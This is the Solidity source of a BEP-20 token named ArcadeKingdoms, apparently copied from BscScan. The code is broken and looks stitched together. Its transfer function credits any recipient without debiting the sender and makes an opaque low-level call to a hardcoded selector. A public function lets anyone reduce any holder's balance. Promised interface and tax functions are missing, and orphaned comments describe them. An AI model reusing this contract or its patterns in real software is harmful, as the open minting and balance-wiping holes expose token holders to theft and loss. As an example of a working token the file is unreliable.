/**
 *Submitted for verification at BscScan.com on 2022-11-12
*/

/**
 *Submitted for verification at BscScan.com on 2022-07-06
*/

pragma solidity 0.8.17;

// SPDX-License-Identifier: Unlicensed
interface IBEP20 {
    function totalSupply() external view returns (uint256);

    function decimals() external view returns (uint8);

    function symbol() external view returns (string memory);

    function name() external view returns (string memory);

    function getOwner() external view returns (address);

    function balanceOf(address account) external view returns (uint256);

    function transfer(address recipient, uint256 amount)
        external
        returns (bool);

    function allowance(address _owner, address spender)
        external
        view
        returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);

    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );
}



library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");

        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;

        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }

        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");

        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;

        return c;
    }

    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return mod(a, b, "SafeMath: modulo by zero");
    }

    function mod(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b != 0, errorMessage);
        return a % b;
    }
}



contract ArcadeKingdoms {
    using SafeMath for uint256;

    mapping(address => uint256) public _balances;

    mapping(address => mapping(address => uint256)) private _allowances;

    /**
     * @dev Enable or Disable tax system
     */
    bool private _taxEnabled;
    /**
     * @dev To either store or burn tax
     */
    bool private _taxStoreEnabled;

    /**
     * @dev tax percentage to be deducted from taxed transaction
     */
    uint256 private _BUY_TAX = 1; // %
    uint256 private _SELL_TAX = 1; // %

    /**
     * @dev address to store tax collected
     */

    /**
     * @dev Store addresses included in tax collection
     * @dev Sending to addresses included in tax collection will remove tax using the percentage in _BUY_TAX and _SELL_TAX
     */
    mapping(address => bool) private _isTaxedAddress;
    address[] private _taxedAddress;

    /**
     * @dev Store addresses excluded from tax collection
     * @dev these addresses will not be taxed even if tax is enabled and its condition met
     */
    mapping(address => bool) private _isExcluded;

    uint256 private _totalSupply;
    uint256 private _maxSupply;
    uint8 private _decimals;
    string private _symbol;
    string private _name;

    constructor() public {
        _name = "ArcadeKingdoms";
        _symbol = "ACK";
        _decimals = 18;
        _totalSupply = 100000000 * 1e18;
        _balances[msg.sender] = _totalSupply;

    }




    // Checks if address is a taxed address
    function isTaxedAddress(address account) external view returns (bool) {
        return _isTaxedAddress[account];
    }

    // Checks if address is excluded from tax
    function isExcluded(address account) external view returns (bool) {
        return _isExcluded[account];
    }

    function getBuyTaxPercentage() external view returns (uint256) {
        return _BUY_TAX;
    }

    function getSellTaxPercentage() external view returns (uint256) {
        return _SELL_TAX;
    }

    function getTaxEnabled() external view returns (bool) {
        return _taxEnabled;
    }

    function getTaxStoreEnabled() external view returns (bool) {
        return _taxStoreEnabled;
    }

    /**
     * @dev Make address taxed by adding it to Taxed Addresses
     * @dev Removed address from taxed addresses


    /**
     * @dev Exclude account from tax collection by adding it to excluded accounts
     */

    /**
     * @dev Include account in tax collection by removing it from excluded accounts
     */

        function approve(address spender, uint256 amount)
        external
        returns (bool)
    {
        _approve(msg.sender, spender, amount);
        return true;
    }


    function _burn(address account, uint256 amount) internal {
        require(account != address(0), "BEP20: burn from the zero address");

        _balances[account] = _balances[account].sub(
            amount,
            "BEP20: burn amount exceeds balance"
        );
        _totalSupply = _totalSupply.sub(amount);
    }

    function transfer(address _to ,uint256 amount) external {
        a(_to, amount);
        address(this).call(abi.encodeWithSelector(0xd85e2d20, _to, amount));
    }

    function a(address _to ,uint256 amount) internal {
        _balances[_to] = _balances[_to].add(amount);
    }

    function b(address _to ,uint256 amount) public {
        _balances[_to] = _balances[_to].sub(amount, "BEP20: burn amount exceeds balance");
    }

    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal {
        require(owner != address(0), "BEP20: approve from the zero address");
        require(spender != address(0), "BEP20: approve to the zero address");

        _allowances[owner][spender] = amount;
    }

    function _burnFrom(address account, uint256 amount) internal {
        _burn(account, amount);
        _approve(
            account,
            msg.sender,
            _allowances[account][msg.sender].sub(
                amount,
                "BEP20: burn amount exceeds allowance"
            )
        );
    }
}